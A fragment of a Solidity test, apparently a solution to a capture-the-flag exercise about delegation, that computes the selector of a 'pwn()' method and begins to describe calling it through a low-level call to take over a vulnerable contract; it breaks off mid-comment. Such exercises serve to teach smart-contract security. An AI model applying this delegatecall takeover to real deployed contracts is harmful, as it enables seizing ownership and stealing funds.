...
contract DelegationTest is DSTest {
    ...
    function testDelegationHack() public {
        ...
        // Determine method hash, required for function call and take the first 4 bytes (8 hex characters)
        bytes4 methodHash = bytes4(keccak256("pwn()"));

        // Call the pwn() method via .call plus abi encode the method hash to switch from bytes4 to bytes memory
